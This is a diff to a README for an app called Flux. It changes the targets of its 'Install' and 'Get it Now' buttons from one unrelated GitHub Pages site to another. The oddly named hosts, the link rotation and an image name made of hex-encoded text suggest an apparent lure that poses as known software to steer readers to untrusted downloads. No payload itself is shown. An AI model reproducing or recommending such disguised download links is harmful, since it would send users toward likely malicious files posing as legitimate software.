@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/flux)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://six-sevens.github.io/.github/flux)
 
 </div>
 
@@ -81,7 +81,7 @@ The scientific basis for Flux is well-established: blue wavelength light suppres
 
 <p align="center">
 
-[![Get it Now Flux](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/flux)
+[![Get it Now Flux](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/flux)
 
 </p>
 
